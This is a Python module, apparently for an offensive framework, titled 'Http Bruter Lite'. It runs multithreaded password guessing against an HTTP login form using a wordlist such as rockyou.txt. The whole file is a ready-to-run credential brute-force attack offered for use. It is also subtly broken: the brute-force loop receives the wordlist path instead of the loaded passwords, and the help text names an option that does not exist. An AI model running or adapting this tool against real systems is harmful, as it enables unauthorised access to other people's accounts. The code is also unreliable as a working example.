import requests, sys, pyfiglet
from threading import Thread
import threading
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Http Bruter Lite',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces Http login page passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('URL', ('Enter target URL (e.g., http://example.com/login)', True, 'HTTP SERVER IP')),
                ('UNAME', ('username (e.g admin)', True, 'HTTP SERVER IP')),
                ('WORDLIST', ('/usr/share/wordlists/rockyou.txt', True, 'Wordlist path')),
                ('THREADS', ('', True, 'Number of threads for concurrent attempts'))
                ])
                }
    def logo(self):
    	title = 'http bruter'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set USER <username> | set URL <http://127.0.0.1/login> | set WORDLIST <path/to/file> | set THREADS <10> ,then run")
   
    # HTTP Brute Force Function
    def http_brute(self,url, username, password):
      try:
        # Prepare POST data
        data = {
            'username': username,
            'password': password
        }
        # Send POST request
        response = requests.post(url, data=data, timeout=5)
        
        # Check for successful login (customize based on the target)
        if "Login failed" not in response.text:
            print(f"[+] Success! Password found: {password}")
            return
        else:
            print(f"[-] Failed: {password}")
      except Exception as e:
        print(f"[-] Error: {e}")
    # Read Wordlist
    def load_wordlist(self,wordlist):
      try:
        with open(wordlist, 'r') as f:
            #self.size = len(f)
            return [line.strip() for line in f]
      except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist}")
        return
    # Threaded Brute Force
    def threaded_brute(self,url, username, wordlist,THREADS):
      for password in wordlist:
        while threading.active_count() > THREADS:
            pass  # Wait for threads to free up
        thread = Thread(target=self.http_brute, args=(url, username, password))
        thread.start()
    
    def execute(self):
        url = self.info['Options']['URL'][0]
        username = self.info['Options']['UNAME'][0]
        wordlist = self.info['Options']['WORDLIST'][0]
        THREADS = self.info['Options']['THREADS'][0]
        self.logo()
        wordlistsize = self.load_wordlist(wordlist)
        #print(f"[*] Loaded {self.size} passwords from {wordlist}")
        print(f"[*] Loaded {len(wordlistsize)} passwords from {wordlist}")
        print(f"[*] Starting brute force on {url} with {THREADS} threads...")
        self.threaded_brute(url, username, wordlist,int(THREADS))
        return "[+] Bruteforcing http login password ..."
    